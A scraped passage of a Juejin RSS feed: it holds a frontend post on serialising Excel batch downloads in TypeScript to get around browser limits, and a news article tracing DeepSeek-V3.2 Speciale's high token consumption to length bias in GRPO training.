pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">问题背景</h2>
<p>笔者在处理公司项目时，收到测试同学的反馈，批量导出excel功能只能导出10个excel文件。笔者写了一个测试demo，还原项目中的实际情况</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/546f56b2553b47e5b572201776c7e2b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Iez566A566A:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443010&amp;x-signature=KKpQeR7L9uA5MDdLIVK%2FN0swBOQ%3D" alt="image.png" loading="lazy"/></p>
<p>点击导出全部用户按钮，结果却是这样的</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bd09f79b2274a95b6935eaa55e71d02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Iez566A566A:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443010&amp;x-signature=RxWh2vxUEIdbqN2%2BrXzN2bW6yMQ%3D" alt="image.png" loading="lazy"/></p>
<p>可以看到，从第19条数据直接跳到50条数据，数据导出不完整。</p>
<p>笔者在网上查了一下，发现同时触发多个 Excel 文件下载，会遇到浏览器下载限制问题：</p>
<ul>
<li><strong>Chrome/Edge</strong>: 通常限制 6-10 个并发下载</li>
<li><strong>超过限制</strong>: 下载会被阻塞或失败</li>
</ul>
<h2 data-id="heading-1">exportExcelSequentially</h2>
<p>为了解决浏览器并发限制，可以防止一次性并发下载，转并发为串行，如下所示</p>
<h3 data-id="heading-2">核心实现</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 顺序导出 Excel 文件，避免浏览器下载限制</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">exportExcelSequentially</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">files: <span class="hljs-built_in">any</span>[], delayMs = <span class="hljs-number">500</span></span>) =&gt; {
	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; files.<span class="hljs-property">length</span>; i++) {
		<span class="hljs-title function_">exportExcel</span>([files[i]]);
		<span class="hljs-keyword">if</span> (i &lt; files.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) {
			<span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(delayMs);
		}
	}
};
</code></pre>
<p>使用 <code>async</code> 函数，允许在函数内部使用 <code>await</code> 关键字，强迫按照顺序导出 Excel 文件</p>
<h2 data-id="heading-3">对比</h2>
<h3 data-id="heading-4">有问题的代码逻辑</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">exportToExcel</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setExporting</span>(<span class="hljs-literal">true</span>);
    <span class="hljs-title function_">setProgress</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; mockUsers.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> user = mockUsers[i];
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">exportSingleUser</span>(user);
      <span class="hljs-title function_">setProgress</span>(i + <span class="hljs-number">1</span>);
    }

    <span class="hljs-title function_">setExporting</span>(<span class="hljs-literal">false</span>);
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">`导出完成！共导出 <span class="hljs-subst">${mockUsers.length}</span> 个 Excel 文件`</span>);
  };
</code></pre>
<p>在这里由于是快速并发导出，很容易导致受到浏览器下载限制</p>
<h3 data-id="heading-5">优化后的代码</h3>
<pre><code class="hljs language-ts" lang="ts"> <span class="hljs-comment">// 串行导出全部用户，避免浏览器下载限制</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">exportToExcelSequentially</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">delayMs = <span class="hljs-number">500</span></span>) =&gt; {
    <span class="hljs-title function_">setExportingSequential</span>(<span class="hljs-literal">true</span>);
    <span class="hljs-title function_">setProgress</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; mockUsers.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> user = mockUsers[i];
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">exportSingleUser</span>(user);
      <span class="hljs-title function_">setProgress</span>(i + <span class="hljs-number">1</span>);
      <span class="hljs-keyword">if</span> (i &lt; mockUsers.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(delayMs);
      }
    }

    <span class="hljs-title function_">setExportingSequential</span>(<span class="hljs-literal">false</span>);
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">`导出完成！共导出 <span class="hljs-subst">${mockUsers.length}</span> 个 Excel 文件`</span>);
  };
</code></pre>
<p>利用 delay 方法把并发变成串行同步</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[DeepSeek-V3.2巨「吃」Token，竟然是被GRPO背刺了]]></title>    <link>https://juejin.cn/post/7579800429376225330</link>    <guid>https://juejin.cn/post/7579800429376225330</guid>    <pubDate>2025-12-04T08:52:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579800429376225330" data-draft-id="7579832417747386419" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="DeepSeek-V3.2巨「吃」Token，竟然是被GRPO背刺了"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2025-12-04T08:52:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            DeepSeek-V3.2巨「吃」Token，竟然是被GRPO背刺了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:52:44.000Z" title="Thu Dec 04 2025 08:52:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>DeepSeek 一发布模型，总会引起业内的高度关注与广泛讨论，但也不可避免的暴露出一些小 Bug。</p>
<p>比如老外用英文询问，它却在思考过程中切回「<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzA3MzI4MjgzMw%3D%3D%26mid%3D2651005317%26idx%3D1%26sn%3D5db7c2faa39d902427c0159eec1c88e9%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzA3MzI4MjgzMw==&amp;mid=2651005317&amp;idx=1&amp;sn=5db7c2faa39d902427c0159eec1c88e9&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">神秘的东方文字</a>」。当然，DeepSeek 模型对汉字「情有独钟」的情况早已出现，「极」字 Bug 就是典型例子。</p>
<p>而这一次，随着新模型 DeepSeek-V3.2 的发布，大家又发现了 DeepSeek 需要优化的地方：其长思考版本（Speciale）暴露出一些 Token 使用效率不佳的问题。</p>
<p>根据多位研究者反馈，DeepSeek-V3.2 Speciale 在处理复杂任务时出现明显的 Token 消耗异常。具体表现为：</p>
<p>在相同任务上，Gemini 只消耗 2 万 Token，DeepSeek-V3.2 Speciale 却用了 7.7 万，也就是说，它需要 3 倍以上的 Token 才能输出类似质量的结果。</p>
<p>另外，Speciale 版本出现输出内容又长又啰嗦的问题，但最终仍然错的情况，这并不是新问题，而是 GRPO 算法本身的固有缺陷。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a48656db798c4dcfafcc13be823d2eff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=CmTuDg7DmCwoJ0%2B0WWM2JbodkUQ%3D" alt="图片" loading="lazy"/></p>
<p>来源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FCompute_King%2Fstatus%2F1996179050012794968" target="_blank" title="https://x.com/Compute_King/status/1996179050012794968" ref="nofollow noopener noreferrer">x.com/Compute_Kin…</a></p>
<p>实际上，DeepSeek-V3.2 在 Token 消耗方面的异常表现，已经被不少用户与研究者观察到。有社区网友指出，Speciale 版本的确具备极强的推理能力，但在实际使用中 Token 消耗速度如喝水般迅速，显著高于同类模型。他们评价，如果 DeepSeek-V3.2 Speciale 的生成速度能够从当前的大约 30 tokens/s 提升至 100 tokens/s 左右，那么其综合可用性和使用体验都将获得大幅改善。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06327f45623f42f8ae2a8dfc33feecab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=Zvqyv0qrdvP%2FWDmfJJ2AWW1iKFA%3D" alt="图片" loading="lazy"/></p>
<p>独立分析 AI 模型和托管服务提供商 Artificial Analysis 则表示：「DeepSeek V3.2 在推理模式下比上一代更啰嗦，在运行 AAII（Artificial Analysis Intelligence Index）基准测试时，输出 Token 消耗明显增加，达 8600 万，而上一版本仅为 6200 万。」</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31b5f8de368c4996949c163d51a3a6ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=l3kh5GYojClZv%2BpF65izQs8no3Y%3D" alt="图片" loading="lazy"/></p>
<p>来源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FArtificialAnlys%2Fstatus%2F1996110264102781332" target="_blank" title="https://x.com/ArtificialAnlys/status/1996110264102781332" ref="nofollow noopener noreferrer">x.com/ArtificialA…</a></p>
<p>「即使是和 Grok 和 Mistral 对比，也是明显看到 DeepSeek V3.2 输出 Token 的延迟。」</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/169c8b8099ed4bc2aaac7eae8d6c5557~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=kv3Wkq3lkDoCvpM2CjmX6NUqwG8%3D" alt="图片" loading="lazy"/></p>
<p>来源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fkurtqian%2Fstatus%2F1995728391115362529" target="_blank" title="https://x.com/kurtqian/status/1995728391115362529" ref="nofollow noopener noreferrer">x.com/kurtqian/st…</a></p>
<p>这种情况，DeepSeek 也在技术报告中很坦诚的承认并且做出了数据对比。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d02ed789b534638bd3e95695159e340~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=Wpt8Idq382HIM0fH9e3P%2BjuHcmk%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aeede5790ade4c0cafe77cbbe7a31e4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=HgjmVL4R6CYTFuvelf2QVORR800%3D" alt="图片" loading="lazy"/></p>
<p>报告中提及，DeepSeek-V3.2-Speciale 的 token 使用效率明显低于 Gemini-3.0-Pro。</p>
<p>为了降低部署成本并减少推理时延，官方版 DeepSeek-V3.2 的训练过程中施加了更为严格的 token 约束，以期在性能与成本之间取得更优的权衡。DeepSeek 研究者们表示，token 效率仍将是未来一个至关重要的研究方向。</p>
<p>DeepSeek 技术报告：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelscope.cn%2Fmodels%2Fdeepseek-ai%2FDeepSeek-V3.2%2Fresolve%2Fmaster%2Fassets%2Fpaper.pdf" target="_blank" title="https://modelscope.cn/models/deepseek-ai/DeepSeek-V3.2/resolve/master/assets/paper.pdf" ref="nofollow noopener noreferrer">modelscope.cn/models/deep…</a></p>
<p>输出内容又长又啰嗦，GRPO 算法存在缺陷</p>
<p>GRPO 算法随着 DeepSeek 的诞生而成为强化学习的黄金范式，相信读者们早就不陌生了。</p>
<p>我们对 GRPO 的方法基本原理曾有过系统的介绍，建议读者参考我们的科普文章。<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzA3MzI4MjgzMw%3D%3D%26mid%3D2650988538%26idx%3D2%26sn%3De86546c536bd88849ce171d461bc4e51%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzA3MzI4MjgzMw==&amp;mid=2650988538&amp;idx=2&amp;sn=e86546c536bd88849ce171d461bc4e51&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">科普向：一文解构大模型后训练，GRPO 和它的继任者们的前世今生</a></p>
<p>早在今年三月份公开的论文《Understanding R1-Zero-Like Training: A Critical Perspective》中，来自 Sea AI Lab 和 NUS 等的研究者们，揭示了 GRPO 算法的两大问题，认为 GRPO 会导致模型有偏置的优化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d051553a2d164a3daf1bc024ecdfaa09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=ZMXW4pmwtzwTPwEX5HIKc%2BSsa%2B8%3D" alt="图片" loading="lazy"/></p>
<ul>
<li>
<p>论文标题：Understanding R1-Zero-Like Training: A Critical Perspective</p>
</li>
<li>
<p>论文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2503.20783" target="_blank" title="https://arxiv.org/pdf/2503.20783" ref="nofollow noopener noreferrer">arxiv.org/pdf/2503.20…</a></p>
</li>
<li>
<p>Github 链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsail-sg%2Funderstand-r1-zero" target="_blank" title="https://github.com/sail-sg/understand-r1-zero" ref="nofollow noopener noreferrer">github.com/sail-sg/und…</a></p>
</li>
</ul>
<p>在 DeepSeek-R1-Zero 的训练过程中，就已有模型的响应长度在整个训练阶段持续增长的现象，而在 DeepSeek-V3.2 Speciale 中仍然存在。</p>
<p>以下公式是经典的 GRPO 损失函数，论文作者很贴心地把影响优化过程的部分标红了：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bc6dbe70aa34a8ca58d2f014064d24b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=f1SUW238yD%2F75ab5KciVWNFHW7U%3D" alt="图片" loading="lazy"/></p>
<p>GRPO 的目标函数结构中存在了：</p>
<ol>
<li>长度偏置（Length Bias）</li>
</ol>
<p>该偏置来源于目标函数中对每个序列引入的归一化因子：<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d47ce6d38604282b7817fb826db899b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=SrX4lsIVM2%2BzNHyeeptUn4n8b7U%3D" alt="图片" loading="lazy"/>  。</p>
<ul>
<li>
<p>当优势函数为正值时（表示对应的响应是正确的）：较短的响应会产生更大的梯度更新幅度，从而使策略在优化过程中更倾向于生成简短的正确答案。</p>
</li>
<li>
<p>当优势函数为负值时（表示对应的响应是错误的）：较长的错误响应所受到的惩罚反而更弱，从而导致策略在错误样本中偏向于生成更长的回答。</p>
</li>
</ul>
<p>这解释了：即便不引入任何「显式鼓励长推理链」的机制，GRPO 训练出的模型也会自然呈现出响应长度不断增长的趋势，躲避惩罚，生成又错又长的回复。</p>
<ol start="2">
<li>难度偏置（Difficulty Bias）</li>
</ol>
<p>该偏置来源于优势函数中对优势函数进行标准化时所使用的分母：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35458e0281254180ab7938ae47efc679~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=2nIlb6kHxKBTdzWkODSMJtZ%2FYh4%3D" alt="图片" loading="lazy"/></p>
<p>这会导致当某些问题的回报标准差较小，尤其是题目过于困难，几乎所有回报都为 0 的时候，在策略更新过程中将被赋予更大的梯度权重，忽视了那些难度适中的实际问题。</p>
<p>我们从 DeepSeek-V3.2 的技术报告中发现，难度偏置已经被优化了，而长度偏置仍然被保留。这或许是 DeepSeek-V3.2 Speciale 超级耗 token 的罪魁祸首。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5427c0af1e544ac9833462b5d6360772~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443164&amp;x-signature=F6fkFsamefAEe%2BJeNjFfAqwKBqw%3D" alt="图片" loading="lazy"/></p>
<p>上述「长度偏置」问题其实由来已久，在 GRPO 的前身 PPO 方法中就早已存在。但是，在 PPO 的损失函数公式中其实并没有「长度偏置」这一项，而在 PPO 的大多开源实现中，却大都加入了这一项。</p>
<p>作者推测，这种不一致性可能源自预训练阶段：</p>
<p>所有 token 会被打包进一个固定长度的上下文窗口，通过对上下文长度进行归一化可以有效提升数值稳定性。</p>
<p>但在 RL 微调阶段保持相同的实现方式会，按照响应长度对损失进行归一化。但响应长度不是常数且在不同样本之间变化剧烈，从而无意中引入了一个长度偏置。</p>
<p>由此可见，理论和实际实现之间总有些许的差别。等到 DeepSeek-V4 的上线，这个问题会不会就此解决呢？</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[云计算一哥出手，大家AI Agent自由了]]></title>    <link>https://juejin.cn/post/7579814711852777482</link>    <guid>https://juejin.cn/post/7579814711852777482</guid>    <pubDate>2025-12-04T08:51:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579814711852777482" data-draft-id="7579832417747370035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="云计算一哥出手，大家AI Agent自由了"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2025-12-04T08:51:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            云计算一哥出手，大家AI Agent自由了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:51:37.000Z" title="Thu Dec 04 2025 08:51:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
